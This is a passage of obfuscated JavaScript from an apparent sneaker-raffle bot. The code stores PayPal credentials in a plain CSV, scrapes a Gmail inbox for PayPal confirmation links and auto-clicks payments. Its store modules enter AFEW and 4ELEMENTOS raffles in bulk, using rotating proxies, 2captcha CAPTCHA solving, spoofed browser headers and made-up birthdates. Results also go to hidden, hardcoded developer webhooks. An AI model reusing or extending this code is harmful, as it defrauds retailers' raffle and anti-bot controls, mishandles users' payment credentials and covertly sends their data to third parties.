            return _0x2c71af[_0x273685['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0xe3d56f = {}, _0x368d2d = await _0x59655c['get']('Email');
        _0xe3d56f['Email'] = _0x368d2d['Email'];
        var _0x2a9a96 = Math['round'](Math['random']() * (_0x3082cc['length'] - 0x1));
        _0xe3d56f['Proxy'] = _0x3082cc[_0x2a9a96], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x22b3db = await _0x59655c['get']('Password');
        return _0xe3d56f['Password'] = _0x22b3db['Password'], _0x147d24['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0xe3d56f['Email'] + ',' + _0xe3d56f['Password'] + ',' + _0xe3d56f['Proxy']), _0xe3d56f;
    }
    let _0x2bd12c = await _0x16493a();
    var _0x34386c = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x12bb77 = await _0x59655c['get']('Amount'), _0x2a0401 = _0x12bb77['Amount'];
    async function _0x41c7bc() {
        let _0x17630c = 0x0;
        var _0x177fc2 = new _0x4ce16c({
            'user': _0x255a87['masterMail'],
            'password': _0x255a87['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x4a41f1(_0xfea971) {
            _0x177fc2['openBox']('INBOX', ![], _0xfea971);
        }
        _0x177fc2['once']('ready', function () {
            _0x4a41f1(function (_0xe8a566, _0x38b259) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0xe8a566)
                    throw _0xe8a566;
                _0x177fc2['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x2ee8b0, _0x121aa7) {
                    if (!_0x121aa7 || !_0x121aa7['length'])
                        console['log'](_0x46dcc5() + '\x20[' + _0x49be1e + ']\x20No\x20mails\x20found'), _0x177fc2['end']();
                    else {
                        _0x121aa7 = _0x121aa7['slice'](0x0, _0x2a0401);
                        var _0x326559 = _0x177fc2['seq']['fetch'](_0x121aa7, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x326559['on']('message', function (_0x13a417, _0x2c4cd4) {
                            var _0x24bd02 = '(#' + _0x2c4cd4 + ')\x20';
                            _0x13a417['on']('body', function (_0x3ba344, _0xa9554d) {
                                _0x425966(_0x3ba344, (_0x3e8c5a, _0x4cf1b5) => {
                                    if (_0x4cf1b5['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x4cf1b5['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x4cf1b5['text']['split']('[')[0x2];
                                        var _0xd32a30 = mes['split'](']')[0x0];
                                        _0x34386c['push'](_0xd32a30);
                                    }
                                });
                            }), _0x13a417['once']('end', function () {
                                _0x17630c++;
                            });
                        }), _0x326559['once']('error', function (_0x4749d9) {
                            console['log']('Fetch\x20error:\x20' + _0x4749d9);
                        }), _0x326559['once']('end', function () {
                            _0x177fc2['end']();
                        });
                    }
                });
            });
        }), _0x177fc2['once']('error', function (_0xb6cdbe) {
            console['log'](_0x3e3bb6['red'](_0xb6cdbe['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x177fc2['once']('end', async function () {
        }), _0x177fc2['connect']();
    }
    try {
        _0x41c7bc(), await _0x4fda60(0xfa0), console['log']('Found\x20' + _0x34386c['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4fda60(0xfa0);
    }
    var _0x79aee7;
    _0xf5e41e('' + _0x49be1e);
    var _0x1d86e2 = _0x2bd12c['Proxy']['split'](':'), _0x319722;
    try {
        _0x319722 = await _0x510708['launch']({
            'userDataDir': 'sessions/' + _0x2bd12c['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x1d86e2[0x0] + ':' + _0x1d86e2[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x319722 = await _0x510708['launch']({
            'userDataDir': 'sessions/' + _0x2bd12c['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x1d86e2[0x0] + ':' + _0x1d86e2[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x46dcc5() + '\x20[' + _0x49be1e + ']\x20Getting\x20Session');
        const _0x55c29f = await _0x319722['newPage']();
        await _0x55c29f['authenticate']({
            'username': '' + _0x1d86e2[0x2],
            'password': '' + _0x1d86e2[0x3]
        }), await _0x55c29f['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x55c29f['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x46dcc5() + '\x20[' + _0x49be1e + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x55c29f['waitForSelector']('#email');
            let _0x5b4d67 = await _0x55c29f['$eval']('#email', _0x4a66e7 => _0x4a66e7['getAttribute']('value'));
            if (_0x5b4d67 == '') {
                await _0x55c29f['type']('#email', _0x2bd12c['Email']), await _0x4fda60(0x1d3);
                let _0x5c8965 = await _0x55c29f['$']('#splitPassword');
                _0x5c8965 && (await _0x55c29f['click']('#btnNext'), await _0x4fda60(0xa28)), await _0x55c29f['type']('#password', _0x2bd12c['Password']), await _0x4fda60(0x35c), await _0x55c29f['click']('#btnLogin');
            } else
                await _0x55c29f['type']('#password', _0x2bd12c['Password']), await _0x4fda60(0x35c), await _0x55c29f['click']('#btnLogin');
            await _0x55c29f['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x46dcc5() + '\x20[' + _0x49be1e + ']\x20Successfully\x20logged\x20in'), await _0x4fda60(0x2710);
        } catch (_0x196e94) {
            throw new Error('Login\x20session\x20expired\x20' + _0x196e94);
        }
        for (var _0x5357b7 = 0x0; _0x5357b7 < _0x34386c['length']; _0x5357b7++) {
            console['log'](_0x46dcc5() + '\x20[' + _0x49be1e + ']\x20Task\x20' + (_0x5357b7 + 0x1) + '\x20:\x20Starting\x20Verification'), _0xf5e41e(_0x49be1e + '\x20Task\x20' + (_0x5357b7 + 0x1) + '\x20/\x20' + _0x34386c['length']);
            const _0x3f0d9f = await _0x319722['newPage']();
            await _0x3f0d9f['goto']('' + _0x34386c[_0x5357b7], { 'waitUntil': 'networkidle2' }), await _0x4fda60(0xbb8);
            try {
                const _0x4de32f = await _0x3f0d9f['$']('#challenge-heading');
                _0x4de32f && (console['log'](_0x46dcc5() + '\x20[' + _0x49be1e + ']\x20Task\x20' + (_0x5357b7 + 0x1) + '\x20:\x20' + _0x3e3bb6['yellow']('2FA\x20Required')), await _0x3f0d9f['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x4fda60(0x9c40), await _0x3f0d9f['waitForSelector']('#payment-submit-btn'), await _0x3f0d9f['$eval']('#payment-submit-btn', _0x397bbf => _0x397bbf['click']()), await _0x3f0d9f['click']('#payment-submit-btn');
                try {
                    await _0x3f0d9f['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x4fda60(0x5dc), console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x49be1e + ']\x20Task\x20' + (_0x5357b7 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x2d6647) {
                    _0x514634 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x2d6647['message']);
                } finally {
                    if (_0x514634 == 'yes' && _0x33cbf6 != 0x2) {
                        console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x49be1e['name'] + ']\x20Task\x20' + (_0x5357b7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x33cbf6 + '\x20/\x205)')), _0x5357b7 = _0x5357b7 - 0x1, _0x33cbf6 = _0x33cbf6 + 0x1;
                        continue;
                    }
                    _0x514634 == 'yes' && _0x33cbf6 >= 0x2 && (_0x2540d5(csv[_0x5357b7], _0x49be1e), _0x514634 = 'no', _0x33cbf6 = 0x0), await _0x3f0d9f['close'](), await _0x4fda60(0x4650);
                }
            } catch (_0x5958a5) {
                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x49be1e + ']\x20Task\x20' + (_0x5357b7 + 0x1) + '\x20:\x20' + _0x5958a5));
            }
        }
    } catch (_0xa909bd) {
        console['log'](_0x3e3bb6['red']('' + _0xa909bd));
    } finally {
        await _0x319722['close']();
    }
}
const _0x365670 = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0x49a8e8, _0x1985a9, _0x3864f0) {
                _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x255a87['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x15afeb = 0x0; _0x15afeb < _0x1985a9['length']; _0x15afeb++) {
                    if (_0xb89722 != 'yes')
                        var _0xb89722 = '', _0x31c0df = 0x0;
                    var _0x3efa7d;
                    try {
                        await _0x436f00(_0x1985a9, _0x15afeb);
                    } catch {
                        _0xb89722 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0xf5e41e(_0x49a8e8['name'] + '\x20Task\x20' + (_0x15afeb + 0x1) + '\x20/\x20' + _0x1985a9['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                    var _0x3cb22d = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0x21a106 = Math['round'](Math['random']() * (_0x3cb22d['length'] - 0x1));
                    _0x1985a9[_0x15afeb]['Size'] == 'RANDOM' && (_0x1985a9[_0x15afeb]['Size'] = _0x3cb22d[_0x21a106]);
                    var _0x487cf0 = Math['round'](Math['random']() * (_0x3864f0['length'] - 0x1)), _0xb58f1a = _0x3864f0[_0x487cf0]['split'](':'), _0x66a0a;
                    try {
                        _0x66a0a = await _0x510708['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xb58f1a[0x0] + ':' + _0xb58f1a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x66a0a = await _0x510708['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xb58f1a[0x0] + ':' + _0xb58f1a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0x46dcc5() + '\x20[' + _0x49a8e8['name'] + ']\x20Task\x20' + (_0x15afeb + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x4d804f = await _0x66a0a['newPage']();
                        await _0x4d804f['authenticate']({
                            'username': '' + _0xb58f1a[0x2],
                            'password': '' + _0xb58f1a[0x3]
                        }), await _0x4d804f['setRequestInterception'](!![]), _0x4d804f['on']('request', _0x40145d => {
                            _0x40145d['resourceType']() === 'image' || _0x40145d['resourceType']() === 'font' || _0x40145d['resourceType']() === 'media' ? _0x40145d['abort']() : _0x40145d['continue']();
                        }), await _0x4d804f['goto'](_0x1985a9[_0x15afeb]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x46dcc5() + '\x20[' + _0x49a8e8['name'] + ']\x20Task\x20' + (_0x15afeb + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x4fda60(0x3e8), await _0x4d804f['waitForSelector']('#accept-all-gdpr'), await _0x4d804f['click']('#accept-all-gdpr'), await _0x4d804f['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0x4fda60(0xbb8);
                        let _0x300f3e = await _0x4d804f['$$']('button');
                        for (button of _0x300f3e) {
                            let _0x42411a = await _0x4d804f['evaluate'](_0x4a3d39 => _0x4a3d39['innerHTML'], button);
                            if (_0x42411a['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x4fda60(0x1388), await _0x4d804f['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0x46dcc5() + '\x20[' + _0x49a8e8['name'] + ']\x20Task\x20' + (_0x15afeb + 0x1) + '\x20:\x20Checking\x20Information'), await _0x4fda60(0x3e8);
                        let _0x32b884 = await _0x4d804f['$$']('input[name=\x22email\x22]');
                        await _0x32b884[0x1]['click'](), await _0x4fda60(0x12c), await _0x4d804f['keyboard']['type'](_0x1985a9[_0x15afeb]['Email']), await _0x4fda60(0x1c2), await _0x4d804f['type']('input[name=\x22Nombre\x22]', _0x1985a9[_0x15afeb]['FirstName'] + '\x20' + _0x1985a9[_0x15afeb]['LastName']), await _0x4fda60(0x1c2), await _0x4d804f['type']('input[name=\x22Direccion\x22]', _0x1985a9[_0x15afeb]['Address1'] + '\x20' + _0x1985a9[_0x15afeb]['HouseNumber'] + '\x20' + _0x1985a9[_0x15afeb]['Address2']), await _0x4fda60(0x1c2), await _0x4d804f['type']('input[name=\x22Ciudad\x22]', _0x1985a9[_0x15afeb]['City']), await _0x4fda60(0x1c2), await _0x4d804f['type']('input[name=\x22Provincia\x22]', _0x1985a9[_0x15afeb]['State']), await _0x4fda60(0x1c2), await _0x4d804f['type']('input[name=\x22CP\x22]', _0x1985a9[_0x15afeb]['Zip']), await _0x4fda60(0x1c2), await _0x4d804f['select']('select[name=\x22Pais\x22]', _0x1985a9[_0x15afeb]['Country']), await _0x4fda60(0x1c2), await _0x4d804f['type']('input[name=\x22Telefono\x22]', _0x1985a9[_0x15afeb]['Phone']), await _0x4fda60(0x1c2), await _0x4d804f['type']('input[name=\x22cumple\x22]', _0x8891f8(0x1, 0x14) + '-' + _0x8891f8(0x1, 0xb) + '-' + _0x8891f8(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0x4fda60(0x1c2), await _0x4d804f['type']('input[name=\x22Instagram\x22]', _0x1985a9[_0x15afeb]['Follower']), await _0x4fda60(0x1c2), await _0x4d804f['type']('input[name=\x22Talla\x22]', _0x1985a9[_0x15afeb]['Size']), await _0x4fda60(0x1f4), await _0x4d804f['click']('#sexo_hombre'), await _0x4fda60(0x1f4), await _0x4d804f['click']('#idioma_ingles'), await _0x4fda60(0x1f4), await _0x4d804f['click']('#privacidad_si'), await _0x4fda60(0x1f4), await _0x4d804f['click']('#acepta_suscripcion_si'), await _0x4fda60(0x1f4), console['log'](_0x46dcc5() + '\x20[' + _0x49a8e8['name'] + ']\x20Task\x20' + (_0x15afeb + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x342980 = await _0x4d804f['$$']('button');
                        for (button of _0x342980) {
                            let _0x3d1a6f = await _0x4d804f['evaluate'](_0x573b81 => _0x573b81['innerHTML'], button);
                            if (_0x3d1a6f['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x4fda60(0x1388), console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x49a8e8['name'] + ']\x20Task\x20' + (_0x15afeb + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0xb89722 = '';
                        var _0x327a93 = await _0x1523c9(_0x1985a9[_0x15afeb], _0x49a8e8, 'dev', ![]), _0x4b2c01 = await _0x1523c9(_0x1985a9[_0x15afeb], _0x49a8e8, 'pub', ![]);
                        const _0x51a458 = {
                            'succesDEVMSG': { 'embeds': [_0x327a93] },
                            'succesPUBMSG': { 'embeds': [_0x4b2c01] }
                        };
                        try {
                            _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x51a458['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x51a458['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x5d80c9, _0x51a458['succesPUBMSG']);
                        } catch (_0x9c63d7) {
                            console['log'](_0x3e3bb6['yellow'](_0x46dcc5() + '\x20[' + _0x49a8e8['name'] + ']\x20Task\x20' + (_0x15afeb + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x9c63d7));
                        }
                    } catch (_0x4bed66) {
                        console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x49a8e8['name'] + ']\x20Task\x20' + (_0x15afeb + 0x1) + '\x20:\x20' + _0x4bed66)), _0x3efa7d = '' + _0x4bed66;
                        var _0x1e3fd3 = await _0x1523c9(_0x1985a9[_0x15afeb], _0x49a8e8, 'dev', !![], _0x3efa7d), _0x327a93 = await _0x1523c9(_0x1985a9[_0x15afeb], _0x49a8e8, 'dev', ![]), _0x4b2c01 = await _0x1523c9(_0x1985a9[_0x15afeb], _0x49a8e8, 'pub', ![]);
                        const _0x340f1d = {
                            'succesDEVMSG': { 'embeds': [_0x327a93] },
                            'succesPUBMSG': { 'embeds': [_0x4b2c01] }
                        };
                        _0x340f1d['errorDEV'] = { 'embeds': [_0x1e3fd3] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x340f1d['errorDEV']), await _0xb6cfae(_0x991bd5, _0x340f1d['errorDEV']), _0x4bed66 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xb89722 = 'yes');
                    } finally {
                        _0x66a0a['close']();
                        if (_0xb89722 == 'yes' && _0x31c0df != 0x5 && _0x3efa7d != 'Size\x20Not\x20Found') {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x49a8e8['name'] + ']\x20Task\x20' + (_0x15afeb + 0x1) + '\x20:\x20Retrying\x20(' + _0x31c0df + '\x20/\x205)\x20')), _0x15afeb = _0x15afeb - 0x1, _0x31c0df = _0x31c0df + 0x1;
                            continue;
                        }
                        _0xb89722 == 'yes' && _0x31c0df >= 0x5 && (_0x2540d5(_0x1985a9[_0x15afeb], _0x49a8e8), _0xb89722 = 'no', _0x31c0df = 0x0), console['log'](_0x46dcc5() + '\x20[' + _0x49a8e8['name'] + ']\x20Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x3daec2, _0x537f4b, _0x519604) {
                for (var _0x436379 = 0x0; _0x436379 < _0x537f4b['length']; _0x436379++) {
                    _0x255a87['AfewDelay'] = _0x255a87['delay'];
                    var _0x21debb;
                    if (_0x1aef9f != 'yes')
                        var _0x1aef9f = '', _0x2206eb = 0x0;
                    var _0x153a99 = _0x537f4b[_0x436379]['Url'], _0x30b838 = _0x537f4b[_0x436379];
                    _0xf5e41e(_0x3daec2['name'] + '\x20Task\x20' + (_0x436379 + 0x1) + '\x20/\x20' + _0x537f4b['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                    try {
                        await _0x436f00(_0x537f4b, _0x436379);
                    } catch {
                        _0x1aef9f = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x27280e(_0x5008b9) {
                        const _0x19e8ce = _0x147d24['readFileSync']('../successful-tasks.csv', 'utf8'), _0x3c9621 = _0x22245b['parse'](_0x19e8ce, { 'header': !![] })['data'];
                        let _0x35c0dd = ![];
                        for (var _0x1abb01 of _0x3c9621) {
                            if (_0x1abb01['Url'] == _0x5008b9['Url'] && _0x1abb01['Email'] == _0x5008b9['Email']) {
                                _0x35c0dd = !![];
                                break;
                            }
                        }
                        return _0x35c0dd;
                    }
                    if (await _0x27280e(_0x537f4b[_0x436379]) == !![]) {
                        console['log'](_0x46dcc5() + '\x20[' + _0x3daec2['name'] + ']\x20Task\x20' + (_0x436379 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x22f170 = await _0x1523c9(_0x537f4b[_0x436379], _0x3daec2, 'dev', ![]), _0x4d69e8 = await _0x1523c9(_0x537f4b[_0x436379], _0x3daec2, 'pub', ![]);
                    const _0x594b35 = {
                        'succesDEVMSG': { 'embeds': [_0x22f170] },
                        'succesPUBMSG': { 'embeds': [_0x4d69e8] }
                    };
                    if (_0x537f4b[_0x436379]['Email'] == '' || _0x537f4b[_0x436379]['FirstName'] == '' || _0x537f4b[_0x436379]['LastName'] == '' || _0x537f4b[_0x436379]['Country'] == '' || _0x537f4b[_0x436379]['Size'] == '' || _0x537f4b[_0x436379]['Address1'] == '' || _0x537f4b[_0x436379]['Zip'] == '') {
                        console['log'](_0x46dcc5() + '\x20[' + _0x3daec2['name'] + ']\x20Task\x20' + (_0x436379 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    _0x537f4b[_0x436379]['Country']['length'] == 0x2 && (_0x537f4b[_0x436379]['Country'] = _0x42dd19[_0x537f4b[_0x436379]['Country']]);
                    if (_0x255a87['useRandomProxy'] = ![])
                        var _0x52553d = _0x519604[_0x436379]['split'](':');
                    else
                        var _0x5ccfe7 = Math['round'](Math['random']() * (_0x519604['length'] - 0x1)), _0x52553d = _0x519604[_0x5ccfe7]['split'](':');
                    var _0xf7800c;
                    try {
                        _0xf7800c = await _0x510708['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x52553d[0x0] + ':' + _0x52553d[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0xf7800c = await _0x510708['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x52553d[0x0] + ':' + _0x52553d[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x4c4954 = JSON['parse'](_0x147d24['readFileSync']('sizes.json', 'utf-8')), _0x153a99 = _0x537f4b[_0x436379]['Url'], _0xd54638 = _0x537f4b[_0x436379]['Size'], _0x55b542;
                        async function _0xdc45ed() {
                            var _0x6be1de = new _0x4fc718['CookieJar']();
                            console['log'](_0x46dcc5() + '\x20[' + _0x3daec2['name'] + ']\x20Task\x20' + (_0x436379 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x23ba91;
                            let _0x20b60b = {
                                'method': 'GET',
                                'cookieJar': _0x6be1de,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x52553d[0x2] + ':' + _0x52553d[0x3] + '@' + _0x52553d[0x0] + ':' + _0x52553d[0x1]
                            }, _0x36711f = _0x153a99['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x2f98b4 = _0x36711f + '.json', _0x87663f = await _0x3c935b(_0x2f98b4);
                            console['log'](_0x46dcc5() + '\x20[' + _0x3daec2['name'] + ']\x20Task\x20' + (_0x436379 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x245f53 = _0x87663f['data']['product']['variants'];
                            if (_0xd54638 != 'RANDOM') {
                                if (_0x245f53[0x1]['option1']['includes']('W')) {
                                    const _0x248444 = _0x4c4954['women']['find'](_0x11b90c => _0x11b90c['EUsize'] === _0xd54638);
                                    _0x248444 && (_0xd54638 = _0x248444['size']);
                                } else {
                                    if (_0x245f53[0x1]['option1']['includes']('Y')) {
                                        const _0x264fdd = _0x4c4954['men']['find'](_0xb9daaf => _0xb9daaf['EUsize'] === _0xd54638);
                                        _0x264fdd && (_0xd54638 = _0x264fdd['size'] + 'Y');
                                    } else {
                                        const _0x528936 = _0x4c4954['men']['find'](_0x10b8db => _0x10b8db['EUsize'] === _0xd54638);
                                        _0x528936 && (_0xd54638 = _0x528936['size']);
                                    }
                                }
                                for (var _0x3cb91f of _0x245f53) {
                                    _0x3cb91f['option1'] == _0xd54638 && (_0x23ba91 = _0x3cb91f['id']);
                                }
                            } else {
                                var _0x41776f = Math['round'](Math['random']() * (_0x245f53['length'] - 0x1));
                                _0x23ba91 = _0x245f53[_0x41776f]['id'];
                            }
                            console['log'](_0x46dcc5() + '\x20[' + _0x3daec2['name'] + ']\x20Task\x20' + (_0x436379 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x3c935b('https://raffles.afew-store.com/cart/' + _0x23ba91 + ':1'), _0x55b542 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0xdc45ed();
                        } catch (_0x586e2d) {
                            if (_0x586e2d['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x586e2d);
                        }
                        const _0x510896 = await _0xf7800c['newPage']();
                        await _0x510896['setDefaultNavigationTimeout'](0x1d4c0), await _0x510896['authenticate']({
                            'username': '' + _0x52553d[0x2],
                            'password': '' + _0x52553d[0x3]
                        }), await _0x510896['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x510896['setRequestInterception'](!![]), _0x510896['on']('request', _0x187575 => {
                            _0x187575['resourceType']() === 'image' || _0x187575['resourceType']() === 'font' || _0x187575['resourceType']() === 'media' ? _0x187575['abort']() : _0x187575['continue']();
                        });
                        try {
                            await _0x510896['goto'](_0x55b542, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x46dcc5() + '\x20[' + _0x3daec2['name'] + ']\x20Task\x20' + (_0x436379 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x510896['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x510896['type']('#checkout_email', '' + _0x537f4b[_0x436379]['Email']), await _0x4fda60(0x320), await _0x510896['type']('#checkout_attributes_instagram', '' + _0x537f4b[_0x436379]['Follower']), await _0x4fda60(0x320), await _0x510896['select']('#checkout_shipping_address_country', '' + _0x537f4b[_0x436379]['Country']), await _0x510896['waitForTimeout'](0x258), await _0x510896['type']('#checkout_shipping_address_first_name', '' + _0x537f4b[_0x436379]['FirstName']), await _0x510896['waitForTimeout'](0x320), await _0x510896['type']('#checkout_shipping_address_last_name', '' + _0x537f4b[_0x436379]['LastName']), await _0x510896['waitForTimeout'](0x2bc), await _0x510896['type']('#checkout_shipping_address_address1', _0x537f4b[_0x436379]['Address1'] + '\x20' + _0x537f4b[_0x436379]['HouseNumber']), await _0x510896['waitForTimeout'](0x2bc), await _0x510896['type']('#checkout_shipping_address_address2', '' + _0x537f4b[_0x436379]['Address2']), await _0x510896['waitForTimeout'](0x2bc), await _0x510896['type']('#checkout_shipping_address_zip', '' + _0x537f4b[_0x436379]['Zip']), await _0x510896['waitForTimeout'](0x2bc), await _0x510896['type']('#checkout_shipping_address_city', '' + _0x537f4b[_0x436379]['City']), await _0x510896['waitForTimeout'](0x2bc);
                        if (_0x537f4b[_0x436379]['State'] != '')
                            try {
                                const _0xff3f75 = JSON['parse'](_0x147d24['readFileSync']('States.json', 'utf8'));
                                await _0x4fda60(0x1f4);
                                if (_0x537f4b[_0x436379]['State']['length'] > 0x2)
                                    for (let _0x2fa1c8 of _0xff3f75) {
